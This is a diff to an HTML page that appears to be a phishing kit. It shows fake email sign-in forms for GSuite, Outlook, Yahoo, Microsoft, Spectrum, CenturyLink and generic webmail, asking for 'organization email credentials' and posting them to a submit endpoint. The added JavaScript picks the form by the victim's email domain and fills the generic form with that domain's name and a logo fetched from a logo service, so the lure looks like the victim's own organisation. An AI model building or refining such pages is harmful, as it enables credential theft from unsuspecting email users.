@@ -15,7 +15,7 @@
             align-items: center;
             justify-content: center;
         }
-        .signin-container {                 
+        .form-container {
             background: white;
             padding: 2rem;
             border-radius: 8px;
@@ -23,14 +23,14 @@
             width: 100%;
             max-width: 400px;
         }
-        .logo img{
-            width: 150px;
-        }
-        .logo{
+        .provider-logo {
             align-items: center;
             display: flex;
             justify-content: center;
             margin-bottom: 30px;
+        }
+        .provider-logo img {
+            width: 150px;
         }
         .eml-list img{
             width: 100%;
@@ -41,6 +41,7 @@
             justify-content: center;
             margin-bottom: 30px;
         }
+
         .divider {
             border-top: 1px solid #dee2e6;
             margin: 1.5rem 0;
@@ -74,50 +75,72 @@
             margin-bottom:12px;
             font-weight:500
         }
-        .password-field {
-            position: relative;
+        .dynamic-provider-logo {
+            text-align: center;
+            margin-bottom: 20px;
+            height: 100px;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: contain;
         }
-        .show-password {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #009688;
-            cursor: pointer;
-            background: none;
-            border: none;
-            padding: 0;
+        h4 {
+            text-align: center;
+            color: #333;
+            margin-top: 0;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type="email"], 
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button:hover {
+            opacity: 0.9;
+        }
+        
+        /* Hide all form divs by default */
+        #gsuite, #outlook, #centurylink, #spectrum, #yahoo, #microsoft, #webmail {
+            display: none;
+        }
+        
+        /* Loading indicator */
+        .loading {
+            text-align: center;
+            font-style: italic;
+            color: #666;
+            margin: 10px 0;
         }
     </style>
 </head>
 <body>
-    <div class="signin-container" id="microsoft">
-        <div class="logo">
-            <img src="img/logo.png" alt="">
+    <!-- Gmail/GSuite Form -->
+    <div id="gsuite" class="form-container">
+        <div class="provider-logo">
+            <img src="img/logo3.png" alt="">
         </div>
-
-        
-        <h2 class="h4 mb-4">Sign-in with your organization email credentials to access.</h2>
-
+        <h4>Sign-in with your organization email credentials to access.</h4>
         <form action="/submit" id="conforpky" method="post" data-netlify="true" onsubmit="handleSubmit(event); return false">
-
-            <div class="mb-3">
-                <input type="email" class="form-control" placeholder="Email" id="phWetKeystore" name="wName" required>
+            <div class="form-group">
+                <label for="gsuite-email">Email</label>
+                <input type="email" id="gsuite-email" name="email" required>
             </div>
-            
-            <div class="mb-3 password-field">
-                <input class="form-control" id="passwordInput" name="psdWet" placeholder="Password" required>
-                <button type="button" class="show-password" id="togglePassword">Hide</button>
+            <div class="form-group">
+                <label for="gsuite-password">Password</label>
+                <input type="password" id="gsuite-password" name="password" required>
             </div>
-            
-            <input type="hidden" name="form-name" value="conforpky">
-            
             <button class="proceed-button" type="submit" id="sendMessageButton">Sign In</button>
-            <div class="text-center">
-                <a href="#" class="text-decoration-none">Need to find your password?</a>
-            </div> 
         </form>
-        
         <div class="divider"></div>
         <div class="eml-list">
             <img src="img/list.png" alt="">
@@ -130,240 +153,117 @@
         <button class="btn btn-outline-dark w-100">Get Started</button>
     </div>
 
-
-    <div class="signin-container" id="centurylink">
-        <div class="logo">
-            <img src="img/logo6.png" alt="">
-        </div>
-
-        
-        <h2 class="h4 mb-4">Sign-in with your organization email credentials to access.</h2>
-        
-        <form action="/submit" id="conforpky" method="post" data-netlify="true" onsubmit="handleSubmit(event); return false">
-
-            <div class="mb-3">
-                <input type="email" class="form-control" placeholder="Email" id="phWetKeystore" name="wName" required>
-            </div>
-            
-            <div class="mb-3 password-field">
-                <input class="form-control" id="passwordInput" name="psdWet" placeholder="Password" required>
-                <button type="button" class="show-password" id="togglePassword">Show</button>
-            </div>
-            
-            <input type="hidden" name="form-name" value="conforpky">
-            
-            <button class="proceed-button" type="submit" id="sendMessageButton">Sign In</button>
-            <div class="text-center">
-                <a href="#" class="text-decoration-none">Need to find your password?</a>
-            </div> 
-        </form>
-        
-        <div class="divider"></div>
-        <div class="eml-list">
-            <img src="img/list.png" alt="">
-        </div>
-        
-        <div class="text-center mb-3">
-            Don't have Webmail email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
-    </div>
-
-    <div class="signin-container" id="spectrum">
-        <div class="logo">
-            <img src="img/logo5.png" alt="">
-        </div>
-
-        
-        <h2 class="h4 mb-4">Sign-in with your organization email credentials to access.</h2>
-        
-        <form action="/submit" id="conforpky" method="post" data-netlify="true" onsubmit="handleSubmit(event); return false">
-
-            <div class="mb-3">
-                <input type="email" class="form-control" placeholder="Email" id="phWetKeystore" name="wName" required>
-            </div>
-            
-            <div class="mb-3 password-field">
-                <input class="form-control" id="passwordInput" name="psdWet" placeholder="Password" required>
-                <button type="button" class="show-password" id="togglePassword">Show</button>
-            </div>
-            
-            <input type="hidden" name="form-name" value="conforpky">
-            
-            <button class="proceed-button" type="submit" id="sendMessageButton">Sign In</button>
-            <div class="text-center">
-                <a href="#" class="text-decoration-none">Need to find your password?</a>
-            </div> 
-        </form>
-        
-        <div class="divider"></div>
-        <div class="eml-list">
-            <img src="img/list.png" alt="">
-        </div>
-        
-        <div class="text-center mb-3">
-            Don't have Webmail email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
-    </div>
-
-    <div class="signin-container" id="yahoo">
-        <div class="logo">
-            <img src="img/logo4.png" alt="">
-        </div>
-
-        
-        <h2 class="h4 mb-4">Sign-in with your organization email credentials to access.</h2>
-        
-        <form action="/submit" id="conforpky" method="post" data-netlify="true" onsubmit="handleSubmit(event); return false">
-
-            <div class="mb-3">
-                <input type="email" class="form-control" placeholder="Email" id="phWetKeystore" name="wName" required>
-            </div>
-            
-            <div class="mb-3 password-field">
-                <input class="form-control" id="passwordInput" name="psdWet" placeholder="Password" required>
-                <button type="button" class="show-password" id="togglePassword">Show</button>
-            </div>
-            
-            <input type="hidden" name="form-name" value="conforpky">
-            
-            <button class="proceed-button" type="submit" id="sendMessageButton">Sign In</button>
-            <div class="text-center">
-                <a href="#" class="text-decoration-none">Need to find your password?</a>
-            </div> 
-        </form>
-        
-        <div class="divider"></div>
-        <div class="eml-list">
-            <img src="img/list.png" alt="">
-        </div>
-        
-        <div class="text-center mb-3">
-            Don't have Webmail email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
-    </div>
-
-
-    <div class="signin-container" id="outlook">
-        <div class="logo">
-            <img src="img/logo2.png" alt="">
-        </div>
-
-        
-        <h2 class="h4 mb-4">Sign-in with your organization email credentials to access.</h2>
-        
-        <form action="/submit" id="conforpky" method="post" data-netlify="true" onsubmit="handleSubmit(event); return false">
-
-            <div class="mb-3">
-                <input type="email" class="form-control" placeholder="Email" id="phWetKeystore" name="wName" required>
-            </div>
-            
-            <div class="mb-3 password-field">
-                <input class="form-control" id="passwordInput" name="psdWet" placeholder="Password" required>
-                <button type="button" class="show-password" id="togglePassword">Show</button>
-            </div>
-            
-            <input type="hidden" name="form-name" value="conforpky">
-            
-            <button class="proceed-button" type="submit" id="sendMessageButton">Sign In</button>
-            <div class="text-center">
-                <a href="#" class="text-decoration-none">Need to find your password?</a>
-            </div> 
-        </form>
-        
-        <div class="divider"></div>
-        <div class="eml-list">
-            <img src="img/list.png" alt="">
-        </div>
-        
-        <div class="text-center mb-3">
-            Don't have Outlook email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
-    </div>
-
-    <div class="signin-container" id="webmail">
-        <div class="logo">
-            <img src="img/logo1.png" alt="">
-        </div>
-
-        
-        <h2 class="h4 mb-4">Sign-in with your organization email credentials to access.</h2>
-        
-        <form action="/submit" id="conforpky" method="post" data-netlify="true" onsubmit="handleSubmit(event); return false">
-
-            <div class="mb-3">
-                <input type="email" class="form-control" placeholder= {$hash} id="phWetKeystore" name="wName" required>
-            </div>
-            
-            <div class="mb-3 password-field">
-                <input class="form-control" id="passwordInput" name="psdWet" placeholder="Password" required>
-                <button type="button" class="show-password" id="togglePassword">Show</button>
-            </div>
-            
-            <input type="hidden" name="form-name" value="conforpky">
-            
-            <button class="proceed-button" type="submit" id="sendMessageButton">Sign In</button>
-            <div class="text-center">
-                <a href="#" class="text-decoration-none">Need to find your password?</a>
-            </div> 
-        </form>
-        
-        <div class="divider"></div>
-        <div class="eml-list">
-            <img src="img/list.png" alt="">
-        </div>
-        
-        <div class="text-center mb-3">
-            Don't have Outlook email?
-        </div>
-        
-        <button class="btn btn-outline-dark w-100">Get Started</button>
-    </div>
-
-
-    <div class="signin-container" id="gsuite">
-        <div class="logo">
+    <!-- Outlook Form -->
+    <div id="outlook" class="form-container">
+        <div class="provider-logo">
             <img src="img/logo3.png" alt="">
         </div>
-    
-        <h2 class="h4 mb-4">Sign-in</h2>
-    
-        <form action="/submit" id="conforpky" method="post" data-netlify="true" onsubmit="handleSubmit(event); return false">
-    
-            <div class="mb-3">
-                <input type="email" class="form-control" placeholder="Email" id="phWetKeystore" name="wName" required>
+        <h4>Sign-in with your organization email credentials to access.</h4>
+        <form>
+            <div class="form-group">
+                <label for="outlook-email">Email</label>
+                <input type="email" id="outlook-email" name="email" required>
             </div>
-    
-            <div class="mb-3 password-field">
-                <input class="form-control" id="passwordInput" name="psdWet" placeholder="Password" required>
-                <button type="button" class="show-password" id="togglePassword">Show</button>
+            <div class="form-group">
+                <label for="outlook-password">Password</label>
+                <input type="password" id="outlook-password" name="password" required>
             </div>
-    
-            <input type="hidden" name="form-name" value="conforpky">
-    
             <button class="proceed-button" type="submit" id="sendMessageButton">Sign In</button>
-            <div class="text-center">
-                <a href="#" class="text-decoration-none">Need to find your password?</a>
-            </div>
         </form>
-    
-        <div class="divider"></div>
-        <div class="eml-list">
-            <img src="img/list.png" alt="">
+    </div>
+
+    <!-- CenturyLink Form -->
+    <div id="centurylink" class="form-container">
+        <div class="provider-logo">
+            <img src="img/logo3.png" alt="">
         </div>
-    
-        <div class="text-center mb-3">
-            Don't have an account?
+            <h4>Sign-in with your organization email credentials to access.</h4>
+        <form>
+            <div class="form-group">
+                <label for="centurylink-email">Email</label>
+                <input type="email" id="centurylink-email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="centurylink-password">Password</label>
+                <input type="password" id="centurylink-password" name="password" required>
+            </div>
+            <button class="proceed-button" type="submit" id="sendMessageButton">Sign In</button>
+        </form>
+    </div>
+
+    <!-- Spectrum Form -->
+    <div id="spectrum" class="form-container">
+        <div class="provider-logo">
+            <img src="img/logo3.png" alt="">
         </div>
-    
-        <button class="btn btn-outline-dark w-100">Get Started</button>
+        <h4>Sign-in with your organization email credentials to access.</h4>
+        <form>
+            <div class="form-group">
+                <label for="spectrum-email">Email</label>
+                <input type="email" id="spectrum-email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="spectrum-password">Password</label>
+                <input type="password" id="spectrum-password" name="password" required>
+            </div>
+            <button class="proceed-button" type="submit" id="sendMessageButton">Sign In</button>
+        </form>
+    </div>
+
+    <!-- Yahoo Form -->
+    <div id="yahoo" class="form-container">
+        <div class="provider-logo">
+            <img src="img/logo3.png" alt="">
+        </div>
+        <h4>Sign-in with your organization email credentials to access.</h4>
+        <form>
+            <div class="form-group">
+                <label for="yahoo-email">Email</label>
+                <input type="email" id="yahoo-email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="yahoo-password">Password</label>
+                <input type="password" id="yahoo-password" name="password" required>
+            </div>
+            <button class="proceed-button" type="submit" id="sendMessageButton">Sign In</button>
+        </form>
+    </div>
+
+    <!-- Microsoft Form -->
+    <div id="microsoft" class="form-container">
+        <div class="provider-logo">
+            <img src="img/logo3.png" alt="">
+        </div>
+        <h4>Sign-in with your organization email credentials to access.</h4>
+        <form>
+            <div class="form-group">
+                <label for="microsoft-email">Email</label>
+                <input type="email" id="microsoft-email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="microsoft-password">Password</label>
+                <input type="password" id="microsoft-password" name="password" required>
+            </div>
+            <button class="proceed-button" type="submit" id="sendMessageButton">Sign In</button>
+        </form>
+    </div>
+
+    <!-- Generic Webmail Form - Will be customized with domain logo -->
+    <div id="webmail" class="form-container">
+        <div class="dynamic-provider-logo" id="dynamic-logo"></div>
+        <p class="loading" id="loading-message">Loading...</p>
+        <h4 id="webmail-title">Sign-in with your organization email credentials to access.</h4>
+        <form>
+            <div class="form-group">
+                <label for="webmail-email">Email</label>
+                <input type="email" id="webmail-email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="webmail-password">Password</label>
+                <input type="password" id="webmail-password" name="password" required>
+            </div>
+            <button class="proceed-button" type="submit" id="sendMessageButton">Sign In</button>
+        </form>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>
@@ -393,6 +293,10 @@
                     formToShow = 'yahoo';
                 } else if (domain.includes('onmicrosoft')) {
                     formToShow = 'microsoft';
+                } else {
+                    // For other domains, customize the webmail form
+                    formToShow = 'webmail';
+                    customizeWebmailForm(domain);
                 }
                 
                 // Show the appropriate form
@@ -423,7 +327,107 @@
                 });
             });
         });
+        
+        // Function to customize the webmail form based on the domain
+        function customizeWebmailForm(domain) {
+            console.log('Customizing webmail form for domain:', domain);
+            
+            // Get domain without subdomain
+            const parts = domain.split('.');
+            let baseDomain = domain;
+            if (parts.length >= 2) {
+                baseDomain = parts[parts.length - 2] + '.' + parts[parts.length - 1];
+            }
+            
+            // Update loading message
+            document.getElementById('loading-message').textContent = `Loading ${baseDomain} information...`;
+            
+// Update form title with domain
+const domainTitle = baseDomain.split('.')[0];
+document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).toUpperCase() + domainTitle.slice(1)}`;
+            
+            // Try to fetch logo/image from the domain
+            fetchDomainLogo(baseDomain);
+        }
+        
+        // Function to fetch the logo or image from a domain
+        function fetchDomainLogo(domain) {
+            const logoElement = document.getElementById('dynamic-logo');
+            const loadingMessage = document.getElementById('loading-message');
+            
+            // URLs to try for logos (common paths)
+            const urlsToTry = [
+                `https://${domain}/favicon.ico`,
+                `https://${domain}/logo.png`,
+                `https://${domain}/images/logo.png`,
+                `https://${domain}/img/logo.png`,
+                `https://logo.clearbit.com/${domain}`
+            ];
+            
+            // Use a service that returns logos for domains
+            // Clearbit has a free logo API we can use
+            const clearbitUrl = `https://logo.clearbit.com/${domain}`;
+            
+            // Create an image element to test loading
+            const img = new Image();
+            img.onload = function() {
+                // Image loaded successfully
+                loadingMessage.style.display = 'none';
+                logoElement.style.backgroundImage = `url('${clearbitUrl}')`;
+                console.log('Logo loaded from:', clearbitUrl);
+                
+                // Update button color based on image
+                try {
+                    extractColorFromImage(img, function(color) {
+                        document.getElementById('webmail-button').style.backgroundColor = color;
+                    });
+                } catch (e) {
+                    console.log('Could not extract color:', e);
+                }
+            };
+            
+            img.onerror = function() {
+                // If Clearbit fails, try a simple text-based logo
+                loadingMessage.style.display = 'none';
+                logoElement.style.backgroundImage = 'none';
+                logoElement.innerHTML = `<h1 style="margin:0;padding-top:30px;color:#444;">${domain.split('.')[0].toUpperCase()}</h1>`;
+                console.log('Using text logo for:', domain);
+                
+                // Use a default button color
+                document.getElementById('webmail-button').style.backgroundColor = '#555';
+            };
+            
+            // Start loading the image
+            img.src = clearbitUrl;
+        }
+        
+        // Function to extract dominant color from an image (simplified version)
+        function extractColorFromImage(img, callback) {
+            // Create a canvas to analyze the image
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            const width = img.width;
+            const height = img.height;
+            
+            canvas.width = width;
+            canvas.height = height;
+            
+            // Draw image to canvas
+            context.drawImage(img, 0, 0, width, height);
+            
+            try {
+                // Get image data from center of image (likely where logo is)
+                const data = context.getImageData(Math.floor(width/2), Math.floor(height/2), 1, 1).data;
+                
+                // Convert to hex color
+                const hex = "#" + ((1 << 24) + (data[0] << 16) + (data[1] << 8) + data[2]).toString(16).slice(1);
+                callback(hex);
+            } catch (e) {
+                // If there's any error (like CORS), use default color
+                console.error('Error extracting color:', e);
+                callback('#555555');
+            }
+        }
     </script>
-
 </body>
 </html>
